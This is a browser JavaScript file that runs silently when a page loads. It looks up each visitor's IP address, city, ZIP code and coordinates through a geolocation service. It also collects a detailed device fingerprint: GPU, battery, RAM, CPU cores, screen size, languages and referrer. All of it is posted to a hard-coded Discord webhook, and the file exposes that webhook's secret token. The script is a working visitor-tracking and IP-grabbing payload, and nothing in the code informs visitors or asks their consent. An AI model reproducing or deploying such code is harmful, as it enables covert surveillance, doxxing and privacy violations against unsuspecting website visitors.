const WEBHOOK_URL = 'https://discord.com/api/webhooks/1497258562165145683/NuNnv3wzsT3b1eSYIOZSYUpshbzrU1H2gSadr2YR5aPPH195LkjBCyATvRIUf5G4DY1K';

// Function to handle the final data sending
async function sendToDiscord(geoData) {
    // Collect Advanced Data
    let batteryInfo = "Unknown";
    try {
        const battery = await navigator.getBattery();
        batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
    } catch (e) {}

    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const connType = connection ? `${connection.effectiveType} (${connection.type || 'unknown'})` : "Unknown";

    const info = {
        ip: geoData.query || geoData.ip || "Unknown",
        city: geoData.city || "Unknown",
        region: geoData.regionName || geoData.region || "Unknown",
        country: geoData.country || geoData.country_name || "Unknown",
        isp: geoData.isp || geoData.org || "Unknown",
        zip: geoData.zip || "Unknown",
        lat: geoData.lat || "0",
        lon: geoData.lon || "0",
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages.join(', '),
        screenRes: `${window.screen.width}x${window.screen.height}`,
        windowSize: `${window.innerWidth}x${window.innerHeight}`,
        cores: navigator.hardwareConcurrency || "Unknown",
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
        battery: batteryInfo,
        connection: connType,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || "Direct Entry",
        gpu: getGPU(),
        timestamp: new Date().toLocaleString()
    };

    const payload = {
        username: "Deep System Logger",
        avatar_url: "https://cdn-icons-png.flaticon.com/512/6840/6840478.png",
        embeds: [{
            title: "🛡️ Advanced Visitor Intelligence",
            description: `Detailed report for visitor from **${info.country}**.`,
            color: 0x00f2ff,
            fields: [
                { name: "🌐 Network & ISP", value: `**IP:** \`${info.ip}\`\n**ISP:** ${info.isp}\n**Conn:** ${info.connection}`, inline: false },
                { name: "📍 Location", value: `**Country:** ${info.country}\n**State:** ${info.region}\n**City:** ${info.city}\n**ZIP:** ${info.zip}\n**Coords:** [${info.lat}, ${info.lon}](https://www.google.com/maps?q=${info.lat},${info.lon})`, inline: true },
                { name: "💻 Hardware", value: `**CPU Cores:** ${info.cores}\n**RAM:** ${info.ram}\n**Battery:** ${info.battery}\n**GPU:** ${info.gpu}`, inline: true },
                { name: "🌍 Environment", value: `**Timezone:** ${info.timezone}\n**Lang:** ${info.language}\n**All Langs:** ${info.languages}`, inline: false },
                { name: "🖥️ Display", value: `**Screen:** ${info.screenRes}\n**Window:** ${info.windowSize}`, inline: true },
                { name: "🔗 Source", value: `**Referrer:** ${info.referrer}`, inline: true },
                { name: "🕵️ Full User Agent", value: `\`\`\`${info.userAgent}\`\`\`` }
            ],
            footer: { text: `System ID: ${Math.random().toString(36).substring(7).toUpperCase()} | ${info.timestamp}` }
        }]
    };

    if (WEBHOOK_URL.startsWith('http')) {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }
}

// JSONP Callback function
window.processGeo = function(data) {
    sendToDiscord(data);
};

// Start the process
function init() {
    const script = document.createElement('script');
    script.src = 'http://ip-api.com/json/?callback=processGeo';
    document.body.appendChild(script);
}

function getGPU() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "Not available";
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic GPU";
    } catch (e) { return "Unknown"; }
}

window.onload = init;
